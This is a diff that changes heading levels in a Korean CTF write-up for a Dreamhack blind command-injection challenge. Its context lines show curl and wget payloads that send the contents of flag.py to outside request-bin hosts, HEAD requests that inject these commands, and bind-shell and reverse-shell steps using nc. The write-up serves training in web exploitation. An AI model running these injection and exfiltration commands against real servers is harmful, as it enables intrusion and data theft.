@@ -103,7 +103,7 @@ Repeater 탭에서 아래와 같이 Request를 `OPTIONS / HTTP/1.1`로 조작�
 
 <br>
 
-## 1. Network Outbound
+### 1. Network Outbound
 
 `app.py` 코드에서 `os.system(cmd)` 시스템 함수를 수행하긴 하지만, 해당 함수의 수행 결과를 직접 인덱스 페이지에 반영해주지 않고, `cmd` 값만 리턴해준다.
 
@@ -133,7 +133,7 @@ Burp Suite에서 워게임 서버에 `HEAD` 메서드를 사용하여, `cmd`에 
 
 <br>
 
-### 1. `curl` : 원격 서버에 POST 메서드로 `cat flag.py`의 결과를 데이터에 전송
+#### 1. `curl` : 원격 서버에 POST 메서드로 `cat flag.py`의 결과를 데이터에 전송
 
 ```shell
 curl https://yzyozog.request.dreamhack.games -d "$(cat flag.py)"
@@ -165,7 +165,7 @@ HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games+-d+"$(cat+flag.py)" HTTP
 
 <br>
 
-### 2. `curl` : 원격 서버에 GET 메서드로 `cat flag.py`의 결과를 파라미터로 전송
+#### 2. `curl` : 원격 서버에 GET 메서드로 `cat flag.py`의 결과를 파라미터로 전송
 
 위와 똑같은 방식으로 `GET` 요청을 보내서 아래와 같이 쿼리 파라미터에 데이터를 담아올 수도 있다.
 
@@ -195,7 +195,7 @@ HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games/?query=%22$(cat+flag.py)
 
 <br>
 
-### 3. **wget** : 원격 서버에 POST 메서드로 **cat flag.py**의 결과를 파라미터로 전송
+#### 3. **wget** : 원격 서버에 POST 메서드로 **cat flag.py**의 결과를 파라미터로 전송
 
 ```shell
 wget https://dzmnkob.request.dreamhack.games --method=POST --body-data="$(cat flag.py)"
@@ -215,7 +215,7 @@ HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games+--method=POST+--body-dat
 
 <br>
 
-### 4. **wget** : 원격 서버에 GET 메서드로 **cat flag.py**의 결과를 파라미터로 전송
+#### 4. **wget** : 원격 서버에 GET 메서드로 **cat flag.py**의 결과를 파라미터로 전송
 
 `wget` 명령어는 `--method`를 정해주지 않으면, 기본적으로 `GET` 메서드를 수행한다.
 
@@ -241,7 +241,7 @@ HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games/?query="$(cat+flag.py)" 
 
 <br>
 
-## 2. Static File Directory
+### 2. Static File Directory
 
 `flask`를 포함한 다양한 프레임워크 또는 웹 에플리케이션에서는, 여러 정적 리소스를 다루기 위해 **Static File Directory**로 `/static` 경로를 사용한다.
 
@@ -271,7 +271,7 @@ Payload를 전달해준 후, `http://host3.dreamhack.games:10383/static/flag_res
 
 <br>
 
-## 3. Bind Shell
+### 3. Bind Shell
 
 위 방법은 서버의 특정 port를 열어 공격자가 접속하는 방법이다. [링크](https://velog.io/@buaii/blind-command)의 풀이를 참고하였다.
 
@@ -293,7 +293,7 @@ HEAD /?cmd=nc+-lvp+[portnum] HTTP/1.1
 
 <br>
 
-## 4. Reverse Shell
+### 4. Reverse Shell
 
 위 방법은 공격자가 특정 port를 열어 서버가 접속하도록 하는 방법이다.
 
